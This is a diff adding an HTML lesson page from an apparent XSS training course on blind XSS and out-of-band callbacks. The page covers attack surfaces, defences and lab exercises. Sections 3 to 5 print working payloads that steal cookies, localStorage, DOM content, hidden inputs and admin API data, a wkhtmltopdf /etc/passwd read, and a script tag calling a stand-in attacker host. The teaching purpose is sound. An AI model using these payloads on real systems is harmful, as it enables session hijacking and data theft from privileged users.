@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Module 11 — Blind XSS & Out-of-Band Techniques</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;line-height:1.7;padding:40px 32px;max-width:820px}
+  h1{font-size:26px;font-weight:800;color:var(--accent);margin-bottom:6px}
+  .mod-tag{font-size:12px;color:var(--muted);margin-bottom:36px;display:block}
+  h2{font-size:18px;font-weight:700;color:var(--warn);margin:36px 0 12px;padding-bottom:6px;border-bottom:1px solid var(--border)}
+  h3{font-size:14px;font-weight:700;color:var(--accent);margin:22px 0 8px}
+  p{font-size:14px;color:var(--text);margin-bottom:12px}
+  ul,ol{font-size:14px;color:var(--text);margin-left:22px;margin-bottom:12px}
+  li{margin-bottom:5px}
+  code{font-family:'Courier New',monospace;font-size:12px;background:#060d1a;color:var(--accent);padding:2px 6px;border-radius:3px}
+  pre{background:#060d1a;border:1px solid var(--border);border-radius:6px;padding:14px 16px;overflow-x:auto;font-size:12px;line-height:1.7;color:#fb923c;margin:12px 0;white-space:pre-wrap}
+  .callout{border-left:3px solid var(--accent);background:var(--panel);padding:12px 16px;border-radius:0 6px 6px 0;margin:14px 0;font-size:13px;color:var(--muted)}
+  .callout strong{color:var(--text)}
+  .warn{border-left-color:var(--warn)}
+  .danger{border-left-color:var(--danger)}
+  .ok{border-left-color:var(--ok)}
+  table{width:100%;border-collapse:collapse;font-size:13px;margin:14px 0}
+  th{padding:8px 12px;background:#060d1a;color:var(--accent);text-align:left;font-size:12px;font-weight:700}
+  td{padding:7px 12px;border-top:1px solid var(--border);color:var(--muted);vertical-align:top}
+  td strong{color:var(--text)}
+  .nav{display:flex;gap:12px;margin-top:48px;padding-top:20px;border-top:1px solid var(--border)}
+  .nav a{font-size:13px;color:var(--accent);padding:8px 18px;border:1px solid var(--accent);border-radius:4px}
+  .label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);margin-bottom:4px}
+  .flow{display:flex;gap:0;align-items:center;flex-wrap:wrap;margin:12px 0}
+  .flow-box{background:var(--panel);border:1px solid var(--border);border-radius:4px;padding:6px 12px;font-size:12px;color:var(--text)}
+  .flow-arrow{color:var(--muted);font-size:16px;margin:0 6px}
+  .flow-box.red{border-color:var(--danger);color:var(--danger)}
+  .flow-box.yellow{border-color:var(--warn);color:var(--warn)}
+  .flow-box.green{border-color:var(--ok);color:var(--ok)}
+  .flow-box.blue{border-color:var(--accent);color:var(--accent)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>Module 11 — Blind XSS & Out-of-Band Techniques</h1>
+<span class="mod-tag">XSS Mastery Course · PhD-Level Cybersecurity · Prerequisite: Modules 01–10</span>
+
+<!-- ─────────────────────────────────────────────────────────────────────────── -->
+<h2>1. What makes XSS "blind"?</h2>
+
+<p>In all prior modules, the attacker could see whether the payload fired: they controlled the request, waited for the response, and observed the alert or network request in their own browser session. <strong>Blind XSS</strong> breaks this assumption.</p>
+
+<p>A blind XSS payload is stored in one place and executed in a completely different context — typically a privileged context the attacker has no direct access to:</p>
+
+<div class="flow">
+  <div class="flow-box yellow">Attacker injects payload<br>(contact form, username, log entry)</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-box">Server stores it<br>(DB, log file, queue)</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-box red">Admin/privileged user<br>views the surface</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-box green">Payload fires in<br>victim's browser</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-box blue">OOB callback to<br>attacker's server</div>
+</div>
+
+<p>The attacker never sees the execution — they only see the <strong>out-of-band callback</strong>: an HTTP request arriving at their controlled server, carrying evidence that the payload fired.</p>
+
+<div class="callout">
+  <strong>Key asymmetry:</strong> The attacker injects without confirmation. Later — hours, days, or weeks later — they receive an OOB callback that proves execution and delivers exfiltrated data. This is why blind XSS is sometimes called "time-delayed" or "asynchronous" XSS.
+</div>
+
+<!-- ─────────────────────────────────────────────────────────────────────────── -->
+<h2>2. Out-of-band (OOB) callback mechanics</h2>
+
+<p>The payload's only job is to make an HTTP request to a server the attacker controls. The browser does this with:</p>
+
+<table>
+  <tr><th>Technique</th><th>Code</th><th>Notes</th></tr>
+  <tr><td><strong>Image beacon</strong></td><td><code>new Image().src = url</code></td><td>No CORS restriction. Works cross-origin. Returns silently.</td></tr>
+  <tr><td><strong>fetch()</strong></td><td><code>fetch(url)</code></td><td>Modern. CORS may block in strict mode. Use no-cors mode for beacons.</td></tr>
+  <tr><td><strong>XMLHttpRequest</strong></td><td><code>new XMLHttpRequest()</code></td><td>Older, verbose. Same CORS rules as fetch.</td></tr>
+  <tr><td><strong>navigator.sendBeacon</strong></td><td><code>navigator.sendBeacon(url, data)</code></td><td>Fires even on page unload. No response read. POST only.</td></tr>
+  <tr><td><strong>WebSocket</strong></td><td><code>new WebSocket(url)</code></td><td>Used when HTTP is blocked by WAF or CSP img-src rules.</td></tr>
+  <tr><td><strong>DNS lookup</strong></td><td>via img src with attacker subdomain</td><td>Bypasses HTTP filtering. Burp Collaborator listens for DNS too.</td></tr>
+</table>
+
+<p>The image beacon (<code>new Image().src</code>) is the most robust: it requires no CORS preflight, works cross-origin by design, fires even if the payload runs in a sandboxed context, and the 1×1 GIF response keeps it visually silent.</p>
+
+<h3>What the callback server captures automatically (without explicit exfiltration)</h3>
+
+<p>Every HTTP request the browser makes carries headers the attacker can read from the server log:</p>
+
+<table>
+  <tr><th>Header</th><th>Data exposed</th></tr>
+  <tr><td><code>Referer</code></td><td>The URL of the page where the payload executed — identifies the vulnerable surface</td></tr>
+  <tr><td><code>User-Agent</code></td><td>Browser and OS version — useful for targeted follow-up exploitation</td></tr>
+  <tr><td><code>Origin</code></td><td>The origin of the request — confirms same-origin or cross-origin context</td></tr>
+  <tr><td><code>Cookie</code></td><td>Not sent to cross-origin callback servers (SameSite policy) — must be exfiltrated explicitly via query string</td></tr>
+  <tr><td>IP address</td><td>Victim's IP → geolocation, corporate network range</td></tr>
+</table>
+
+<div class="callout warn">
+  <strong>Cookies and SameSite:</strong> Modern browsers set <code>SameSite=Lax</code> by default, which means cookies are NOT sent to cross-origin requests. To steal a cookie, the payload must read <code>document.cookie</code> and embed it in the URL: <code>fetch('/oob?c='+document.cookie)</code>.
+</div>
+
+<!-- ─────────────────────────────────────────────────────────────────────────── -->
+<h2>3. Common blind XSS surfaces</h2>
+
+<h3>3.1 Application log viewers</h3>
+
+<p>Applications that log user activity — search terms, error messages, usernames, HTTP request data — and display those logs in a browser-rendered admin dashboard are a high-value blind XSS surface. The pattern:</p>
+
+<ol>
+  <li>User (attacker) submits a payload in any field that reaches a log entry: search query, username, error message, form field, HTTP header.</li>
+  <li>The application logs the raw value without sanitisation (common — logging libraries treat all values as strings, not HTML).</li>
+  <li>An admin opens the log viewer. The browser renders the stored HTML. The payload fires in the admin's session.</li>
+</ol>
+
+<p>Real-world examples: Kibana's log viewer (early versions rendered raw log data), custom ELK dashboards, Splunk search result displays, in-house log consoles.</p>
+
+<h3>3.2 PDF and report generators</h3>
+
+<p>Server-side PDF generators (wkhtmltopdf, Puppeteer, headless Chrome, Prince XML, WeasyPrint) work by:</p>
+<ol>
+  <li>Accepting user-supplied content or templates</li>
+  <li>Rendering the HTML in a headless browser engine</li>
+  <li>Capturing a screenshot or DOM snapshot as PDF output</li>
+</ol>
+
+<p>If user-supplied content reaches the HTML template without sanitisation, the headless browser renders the XSS payload. The execution context is a <em>server-side headless browser</em> — giving the payload access to the server's local network.</p>
+
+<div class="callout danger">
+  <strong>wkhtmltopdf SSRF via XSS:</strong> wkhtmltopdf renders local file URIs by default. A payload like <code>&lt;iframe src="file:///etc/passwd"&gt;</code> causes the PDF generator to include the server's local file in the PDF output — this is a combined XSS + SSRF that exfiltrates internal files. CVE-2019-6297 is one documented instance.
+</div>
+
+<pre>&lt;!-- wkhtmltopdf SSRF payload (illustrative) --&gt;
+&lt;script&gt;
+  x = new XMLHttpRequest;
+  x.onload = function(){ document.write(this.responseText); };
+  x.open("GET","file:///etc/passwd");
+  x.send();
+&lt;/script&gt;</pre>
+
+<h3>3.3 Email template renderers</h3>
+
+<p>Applications that generate HTML emails from user-supplied fields (name, subject, body, notification message) and preview those emails in a webmail-style interface are blind XSS surfaces when the preview renders HTML without sanitisation.</p>
+
+<p>Common injection points: the "From" display name, the email subject line, the email body, and notification preference fields. If any of these end up in an HTML email template rendered in a browser, they become XSS vectors.</p>
+
+<h3>3.4 Customer support / helpdesk platforms</h3>
+
+<p>When a user submits a support ticket, the ticket title, description, and attachment filenames are stored and later viewed by a support agent in an internal dashboard. If the dashboard renders raw HTML, the agent's browser (and session) is the victim. This has affected Zendesk, Freshdesk, and many custom helpdesk builds.</p>
+
+<h3>3.5 Profile fields viewed in admin panels</h3>
+
+<p>Username, bio, and website fields that are stored and later rendered in an admin user management panel are classic second-order blind XSS surfaces — exactly the pattern demonstrated in Module 10's <code>/admin</code> panel.</p>
+
+<!-- ─────────────────────────────────────────────────────────────────────────── -->
+<h2>4. Payload engineering for blind XSS</h2>
+
+<h3>4.1 Zero-interaction triggers</h3>
+
+<p>Because the attacker cannot see when the payload fires, it must fire without any user interaction — the admin just needs to <em>load</em> the page. Use the zero-interaction event handlers from Module 05:</p>
+
+<table>
+  <tr><th>Vector</th><th>Zero-interaction trigger</th></tr>
+  <tr><td><code>&lt;img src=x onerror=...&gt;</code></td><td><code>onerror</code> fires immediately when src fails to load</td></tr>
+  <tr><td><code>&lt;svg onload=...&gt;</code></td><td><code>onload</code> fires when SVG is parsed</td></tr>
+  <tr><td><code>&lt;input autofocus onfocus=...&gt;</code></td><td><code>onfocus</code> fires automatically on page load</td></tr>
+  <tr><td><code>&lt;details open ontoggle=...&gt;</code></td><td><code>ontoggle</code> fires on open state change at parse time</td></tr>
+  <tr><td><code>&lt;body onload=...&gt;</code></td><td><code>onload</code> fires when body element loads (if injection is before body)</td></tr>
+</table>
+
+<h3>4.2 Staged payload: confirm, then exfiltrate</h3>
+
+<p>A real blind XSS payload has two stages:</p>
+
+<pre>&lt;img src=x onerror="(()=>{
+  /* Stage 1: confirm execution */
+  new Image().src = '/oob?hit=1&ref=' + encodeURIComponent(location.href);
+
+  /* Stage 2: exfiltrate high-value data */
+  const data = new URLSearchParams({
+    cookie: document.cookie,
+    url:    location.href,
+    title:  document.title,
+    ls:     btoa(JSON.stringify({...localStorage}))
+  });
+  fetch('/oob?' + data.toString(), {mode:'no-cors'});
+})()"&gt;</pre>
+
+<h3>4.3 DOM content exfiltration</h3>
+
+<p>When the payload fires in an admin panel, the DOM contains privileged data — admin user lists, CSRF tokens, API keys in hidden inputs, session tokens in JavaScript variables. Exfiltrate the full DOM:</p>
+
+<pre>fetch('/oob?dom=' + btoa(document.documentElement.innerHTML), {mode:'no-cors'});</pre>
+
+<p>Or target specific elements:</p>
+
+<pre>/* Steal all input values (hidden fields, CSRF tokens) */
+const inputs = [...document.querySelectorAll('input')].map(i=>({name:i.name,value:i.value}));
+fetch('/oob?inputs=' + btoa(JSON.stringify(inputs)), {mode:'no-cors'});</pre>
+
+<h3>4.4 Same-origin fetch for API access</h3>
+
+<p>When the payload fires in an admin's browser, it runs in the admin's origin with the admin's cookies — enabling same-origin fetch requests to privileged API endpoints:</p>
+
+<pre>/* Fetch the admin user list and exfiltrate it */
+fetch('/api/admin/users', {credentials:'include'})
+  .then(r => r.text())
+  .then(text => fetch('/oob?users=' + btoa(text), {mode:'no-cors'}));</pre>
+
+<!-- ─────────────────────────────────────────────────────────────────────────── -->
+<h2>5. Tooling: XSS Hunter and Burp Collaborator</h2>
+
+<h3>5.1 XSS Hunter</h3>
+
+<p>XSS Hunter (xsshunter.com, also self-hostable) provides:</p>
+<ul>
+  <li>A hosted callback server at a unique subdomain (e.g., <code>attacker.xss.ht</code>)</li>
+  <li>A JavaScript payload that, on execution, captures: page URL, cookies, DOM snapshot, localStorage, referrer, and a screenshot via HTML2Canvas</li>
+  <li>An email notification when any payload fires</li>
+  <li>A dashboard showing all historical callbacks with full captured data</li>
+</ul>
+
+<p>The standard XSS Hunter payload looks like:</p>
+<pre>&lt;script src="https://attacker.xss.ht"&gt;&lt;/script&gt;</pre>
+<p>It loads an external script that performs all exfiltration. The <code>/oob</code> endpoint in this lab models the receiving side of this infrastructure.</p>
+
+<h3>5.2 Burp Collaborator</h3>
+
+<p>Burp Suite Pro's Collaborator provides a hosted server that listens for HTTP, HTTPS, DNS, and SMTP callbacks. Used for:</p>
+<ul>
+  <li>Blind XSS callback detection (HTTP/HTTPS)</li>
+  <li>SSRF confirmation (HTTP + DNS)</li>
+  <li>XXE out-of-band exfiltration (DNS + HTTP)</li>
+  <li>Blind command injection (DNS)</li>
+</ul>
+
+<p>In a test engagement, replace <code>/oob</code> with your Burp Collaborator URL and use the Collaborator client to see all incoming requests with full headers.</p>
+
+<!-- ─────────────────────────────────────────────────────────────────────────── -->
+<h2>6. Dwell time and persistence advantage</h2>
+
+<p>The most strategically significant property of blind XSS is <strong>persistence</strong>. A payload injected into a log store, a support ticket, or a user profile may fire every time an admin views that surface — for weeks or months — until the record is deleted.</p>
+
+<table>
+  <tr><th>Property</th><th>Reflected XSS</th><th>Blind Stored XSS</th></tr>
+  <tr><td>Requires victim to click a link</td><td>Yes</td><td>No</td></tr>
+  <tr><td>Attacker sees execution</td><td>Yes (immediate)</td><td>No (OOB callback only)</td></tr>
+  <tr><td>Persistence</td><td>Single use</td><td>Fires on every admin page view</td></tr>
+  <tr><td>Target privilege level</td><td>Anyone with the link</td><td>Typically admin/privileged users</td></tr>
+  <tr><td>Detection difficulty</td><td>Moderate (URL-based evidence)</td><td>High (no URL evidence at injection time)</td></tr>
+  <tr><td>Payload delivery rate</td><td>Attacker-controlled</td><td>Victim-controlled (when admin views)</td></tr>
+</table>
+
+<div class="callout">
+  <strong>Strategic value:</strong> A single blind XSS injection into a log store can yield dozens of admin session callbacks as different staff members view the logs over weeks. Each callback delivers fresh session data.
+</div>
+
+<!-- ─────────────────────────────────────────────────────────────────────────── -->
+<h2>7. Defences specific to blind XSS</h2>
+
+<h3>7.1 Output encoding at the rendering layer — not the storage layer</h3>
+
+<p>A common mistake is to "sanitise on input" at the logging endpoint. This fails when the same data is also used in non-HTML contexts (analytics, raw log files) where HTML encoding would corrupt the data. The correct fix is <strong>context-aware encoding at the render layer</strong>: HTML-encode every value when building the log viewer HTML.</p>
+
+<h3>7.2 Content Security Policy on admin surfaces</h3>
+
+<p>Admin log viewers, helpdesk panels, and report preview pages should have strict CSPs that block inline scripts and restrict <code>img-src</code> to known domains. This limits what an OOB beacon can reach even if payload execution occurs.</p>
+
+<pre>Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:</pre>
+
+<p>Note: CSP does not prevent <code>fetch()</code> or <code>XMLHttpRequest</code> to same-origin endpoints — a payload can still exfiltrate data to same-origin paths and trigger CSRF attacks even under strict CSP.</p>
+
+<h3>7.3 Trusted Types at rendering sinks</h3>
+
+<p>If the log viewer builds HTML via <code>innerHTML</code>, Trusted Types prevents assignment of arbitrary strings to that sink — forcing the use of a sanitiser library that returns a TrustedHTML type.</p>
+
+<h3>7.4 PDF generator hardening</h3>
+
+<ul>
+  <li>Disable local file access in wkhtmltopdf: <code>--disable-local-file-access</code></li>
+  <li>Use Puppeteer with <code>--no-sandbox</code> disabled and network access restricted to known domains</li>
+  <li>Pre-sanitise all user content with a server-side allowlist sanitiser before inserting into templates</li>
+  <li>Render PDF generation in an isolated container with no access to internal services</li>
+</ul>
+
+<h3>7.5 Email renderer hardening</h3>
+
+<ul>
+  <li>Use a dedicated email sanitiser (e.g., <code>email_reply_parser</code> + DOMPurify) on the preview surface</li>
+  <li>Render email previews inside a sandboxed iframe: <code>sandbox="allow-same-origin"</code> (without <code>allow-scripts</code>)</li>
+  <li>Strip all HTML from fields that should be plain text (subject lines, display names)</li>
+</ul>
+
+<!-- ─────────────────────────────────────────────────────────────────────────── -->
+<h2>8. Exercises</h2>
+
+<ol>
+  <li>
+    <strong>Confirm basic blind execution:</strong> Using the attack demo, inject the bare OOB beacon (<code>&lt;img src="/oob?hit=1"&gt;</code>) via <code>POST /log-entry</code>, open <code>/log-viewer</code>, and verify the callback appears in <code>/oob/log</code>. Note the Referer header — it confirms which surface the payload fired on.
+  </li>
+  <li>
+    <strong>Exfiltrate DOM content:</strong> Craft a payload that, on execution in <code>/log-viewer</code>, fetches the full page DOM (<code>document.documentElement.innerHTML</code>), base64-encodes it, and sends it to <code>/oob?dom=...</code>. Inspect the captured data in <code>/oob/log</code>.
+  </li>
+  <li>
+    <strong>PDF generator SSRF simulation:</strong> In the <code>/pdf-preview</code> surface, inject a payload that reads <code>document.title</code> and exfiltrates it via OOB. In a real wkhtmltopdf deployment, replace this with a <code>file://</code> iframe read.
+  </li>
+  <li>
+    <strong>Email header injection:</strong> In the <code>/email-preview</code> surface, inject a double-quote into the <code>to=</code> parameter to break out of the HTML attribute and inject markup. Confirm the To: field is rendered as raw HTML.
+  </li>
+  <li>
+    <strong>Persistence audit:</strong> Inject payloads into three different surfaces (log entry, /board comment, /admin profile). Open each surface in sequence. Observe that each surfaces delivers a separate OOB callback — mapping the injection point via the Referer header. This models a real blind XSS audit across multiple application surfaces.
+  </li>
+</ol>
+
+<div class="nav">
+  <a href="attack_07_blind.html">← Attack Demo 07</a>
+  <a href="../module_12/tutorial.html">Module 12 →</a>
+</div>
+
+</body>
+</html>
